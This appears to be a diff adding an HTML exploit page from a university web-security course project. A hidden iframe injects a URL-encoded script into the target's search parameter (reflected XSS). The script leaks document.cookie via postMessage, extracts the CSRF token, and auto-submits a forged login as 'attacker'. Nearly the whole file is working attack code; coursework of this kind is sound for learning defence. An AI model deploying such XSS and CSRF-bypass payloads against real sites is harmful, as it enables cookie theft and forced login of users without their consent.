@@ -1,0 +1,50 @@
+
+
+
+<html>
+<body>
+    <script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <iframe style="display:none" name = "inconspicuous" src = "https://project2.eecs388.org/search?q=++++%3Cscript%3E+++++++++parent.postMessage%28document.cookie%2C+%22*%22%29%3B+++++++++window.addEventListener%28%22message%22%2C+function%28input%29+%7B+++++++++++++if+%28event.data+%21%3D+%22%22%29+%7B+++++++++++++++++f+%3D+document.createElement%28%22form%22%29%3B+++++++++++++++++f.setAttribute%28%22method%22%2C+%22POST%22%29%3B+++++++++++++++++f.setAttribute%28%22action%22%2C+%22https%3A%2F%2Fproject2.eecs388.org%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%22%29%3B+++++++++++++++++document.body.appendChild%28f%29%3B++++++++++++++++++user%3Ddocument.createElement%28%22input%22%29%3B+++++++++++++++++pass+%3D+document.createElement%28%22input%22%29%3B+++++++++++++++++csrf+%3D+document.createElement%28%22input%22%29%3B++++++++++++++++++user.setAttribute%28%22name%22%2C+%22username%22%29%3B+++++++++++++++++pass.setAttribute%28%22name%22%2C+%22password%22%29%3B+++++++++++++++++csrf.setAttribute%28%22name%22%2C+%22csrf_token%22%29%3B++++++++++++++++++++++++++++++++++user.setAttribute%28%22value%22%2C+%22attacker%22%29%3B+++++++++++++++++pass.setAttribute%28%22value%22%2C+%22l33th4x%22%29%3B++++++++++++++++++var+token+%3D+input.data%3B++++++++++++++++++++++++++++++++++csrf.setAttribute%28%22value%22%2C+token%29%3B++++++++++++++++++++++++++++++++++document.forms.item%280%29.appendChild%28csrf%29%3B+++++++++++++++++document.forms.item%280%29.appendChild%28user%29%3B+++++++++++++++++document.forms.item%280%29.appendChild%28pass%29%3B+++++++++++++++++++++++++++++++++++document.forms.item%280%29.submit%28%29%3B++++++++++%7D+++++%7D%29%3B+++++%3C%2Fscript%3E"></iframe>
+    <!-- Post cookies, use https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage to get it,
+         then make and post new frame -->
+          <!-- https://www.w3schools.com/jsref/coll_doc_forms.asp-->
+          
+    <script>
+        parent.postMessage(document.cookie, "*");
+        window.addEventListener("message", function(input) {
+            if (event.data != "") {
+                f = document.createElement("form");
+                f.setAttribute("method", "POST");
+                f.setAttribute("action", "https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0");
+                
+                document.body.appendChild(f);
+                user=document.createElement("input");
+                pass = document.createElement("input");
+                csrf = document.createElement("input");
+
+                user.setAttribute("name", "username");
+                pass.setAttribute("name", "password");
+                csrf.setAttribute("name", "csrf_token");
+                
+                user.setAttribute("value", "attacker");
+                pass.setAttribute("value", "l33th4x");
+
+                var token = input.data.substr(-32);
+                
+                csrf.setAttribute("value", token);
+
+               
+                document.forms.item(0).appendChild(csrf);
+                document.forms.item(0).appendChild(user);
+                document.forms.item(0).appendChild(pass);
+                
+
+                document.forms.item(0).submit();
+
+        }
+    });
+    </script>
+
+</body>
+</html>
+
